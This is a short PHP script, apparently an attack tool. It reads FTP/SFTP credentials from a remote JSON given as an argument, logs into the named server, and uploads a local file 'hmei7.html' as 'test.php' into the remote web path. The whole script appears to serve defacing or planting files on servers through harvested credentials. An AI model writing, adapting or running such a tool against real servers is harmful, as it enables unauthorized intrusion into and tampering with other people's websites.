<?php

require __DIR__ . '/vendor/autoload.php';

use altayalp\FtpClient\Servers\FtpServer;
use altayalp\FtpClient\Servers\SftpServer;
use altayalp\FtpClient\FileFactory;

$urlToRemoteJson = $argv[1];

$pathToLocalFile = '/srv/http/hmei7.html';
$outName = 'test.php';
$credentials = file_get_contents($urlToRemoteJson);
$credentials = json_decode($credentials, true);

if ($credentials === null) {
    echo 'Invalid credentials';
    exit(1);
}

if (isset($credentials['host'])) {
    $hostname = $credentials['host'];
} else if (isset($credentials['hostname'])) {
    $hostname = $credentials['hostname'];
}

if (isset($credentials['username'])) {
    $username = $credentials['username'];
} else if (isset($credentials['user'])) {
    $username = $credentials['user'];
}

if (isset($credentials['password'])) {
    $password = $credentials['password'];
} else if (isset($credentials['pass'])) {
    $password = $credentials['pass'];
}

if (isset($credentials['port'])) {
    if (empty($isSftpServer)) {
        if ($credentials['port'] == 22) {
            $isSftpServer = true;
        } else if ($credentials['port'] == 21){
            $isSftpServer = false;
        }
    }
}

if (isset($credentials['protocol'])) {
    if ($credentials['protocol'] == 'ftp') {
        $isSftpServer = false;
    } else {
        $isSftpServer = true;
    }
} else if (isset($credentials['type'])) {
    if ($credentials['type'] == 'ftp') {
        $isSftpServer = false;
    } else {
        $isSftpServer = true;
    }
}

if (empty($credentials['port'])) {
    if ($isSftpServer) {
        $credentials['port'] = 22;
    } else {
        $credentials['port'] = 21;
    }
}

$port = $credentials['port'];

$pathToRemoteFile = $credentials['remotePath'] . DIRECTORY_SEPARATOR . $outName;

if ($isSftpServer) {
    $server = new SftpServer($hostname, $port);
} else {
    $server = new FtpServer($hostname, $port);
}

$server->login($username, $password);
$file = FileFactory::build($server);

$fileStatus = $file->upload($pathToLocalFile, $pathToRemoteFile);

if($fileStatus == 1) {
    echo $hostname . DIRECTORY_SEPARATOR . $outName, PHP_EOL;
    return;
}